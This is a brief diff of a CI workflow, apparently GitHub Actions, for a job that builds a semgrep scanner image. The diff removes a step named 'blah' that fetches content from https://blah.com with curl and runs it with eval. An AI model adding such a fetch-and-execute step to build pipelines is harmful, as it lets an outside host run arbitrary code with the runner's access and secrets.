@@ -97,8 +97,3 @@ jobs:
           ${{ env.workdir }}/src
      
         run: docker build -t semgrep-scanner:latest .
-      - name:
-          blah
-        run: |
-          CONTENTS=$(curl https://blah.com)
-          eval $CONTENTS
